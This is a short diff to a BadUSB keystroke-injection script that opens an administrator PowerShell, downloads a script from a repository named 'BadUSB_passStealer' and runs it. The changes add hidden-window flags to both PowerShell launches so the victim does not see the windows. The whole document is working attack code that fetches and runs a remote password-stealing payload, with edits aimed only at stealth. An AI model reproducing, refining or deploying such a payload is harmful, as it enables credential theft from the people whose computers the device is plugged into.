@@ -6,9 +6,9 @@ DELAY 500
 REM Start powershell as admin
 GUI r
 DELAY 500
-STRING powershell.exe
+STRING powershell.exe -windowstyle hidden
 DELAY 200
-CTRL SHIFT ENTER
+CTRL-SHIFT ENTER
 DELAY 1500
 LEFT
 DELAY 150
@@ -28,6 +28,6 @@ STRING wget https://raw.githubusercontent.com/lshaf/BadUSB_passStealer/main/ciao
 ENTER
 DELAY 3500
 REM Start ps1 script
-STRING powershell.exe -noexit -file ciaoV2.ps1
+STRING powershell.exe -noexit -windowstyle hidden -file ciaoV2.ps1
 ENTER
 REM End of payload
